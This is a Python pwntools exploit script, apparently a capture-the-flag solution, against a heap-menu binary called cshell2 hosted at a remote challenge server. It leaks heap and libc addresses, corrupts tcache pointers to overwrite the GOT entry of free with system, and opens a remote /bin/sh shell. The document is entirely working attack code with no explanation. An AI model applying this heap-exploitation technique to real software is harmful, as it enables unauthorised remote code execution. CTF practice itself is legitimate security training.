from pwn import *

elf = ELF('./cshell2')
libc = ELF('./libc.so.6')

def add(idx, size, fn, mn, ln, age, bio):
    p.recvrepeat(0.01)
    p.sendline(b'1')
    p.sendlineafter(b':', str(idx).encode())
    p.sendlineafter(b':', str(size).encode())
    p.sendafter(b':', fn)
    p.sendafter(b':', mn)
    p.sendafter(b':', ln)
    p.sendlineafter(b':', str(age).encode())
    p.sendlineafter(b':', bio)

def show(idx):
    p.recvrepeat(0.01)
    p.sendline(b'2')
    p.sendlineafter(b':', str(idx).encode())

def delete(idx):
    p.recvrepeat(0.01)
    p.sendline(b'3')
    p.sendlineafter(b':', str(idx).encode())

def re_age(idx, age):
    p.recvrepeat(0.01)
    p.sendline(b'5')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(age).encode())

def edit(idx, fn, mn, ln, age, bio):
    p.recvrepeat(0.01)
    p.sendline(b'4')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b':', fn)
    p.sendafter(b':', mn)
    p.sendafter(b':', ln)
    p.sendlineafter(b':', str(age).encode())
    p.sendafter(b':', bio)

def mask(addr):
    return addr ^ (heap_base >> 12)

while(1):
    try:
        # p = process('./cshell2')
        p = remote('be.ax', 31667)

        add(0, 0x428, b'a', b'a', b'a', 1, b'a')
        add(1, 0x408, b'a', b'a', b'a', 1, b'a')
        add(2, 0x418, b'a', b'a', b'a', 1, b'a')
        add(3, 0x408, b'a', b'a', b'a', 1, b'a')
        add(10, 0x500, b'a', b'a', b'a', 1, b'a')
        add(11, 0x408, b'a', b'a', b'a', 1, b'a')

        delete(0)

        add(4, 0x438, b'a', b'a', b'a', 1, b'a')

        delete(2)

        re_age(0, 0x4040f8 - 0x20)

        delete(1)
        delete(3)

        add(5, 0x438, b'a', b'a', b'a', 1, b'a')

        delete(10)
        show(3)

        p.recvuntil(b'first: ')

        p.recvuntil(b'')

        heap_base = (u64(p.recvuntil(b' ')[:-1].ljust(8, b'\x00')) >> 12) << 12
        print(hex(heap_base))

        edit(3, p64(mask(elf.got.free - 8)), b'a', b'a', 1, b'a'*0x3d0)

        show(3)

        p.recvuntil(b'a'*0x3d0)

        libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x1c7cc0
        print(hex(libc.address))

        system = libc.sym['system']

        add(6, 0x408, b'/bin/sh', b'a', b'a', 1, b'a')
        add(7, 0x408, b'a', p64(system), b'\xb0', 1, p64(libc.sym['__isoc99_scanf']))

        delete(6)

        break
    except KeyboardInterrupt:
        p.close()
        exit(1)
    except:
        p.close()

p.interactive()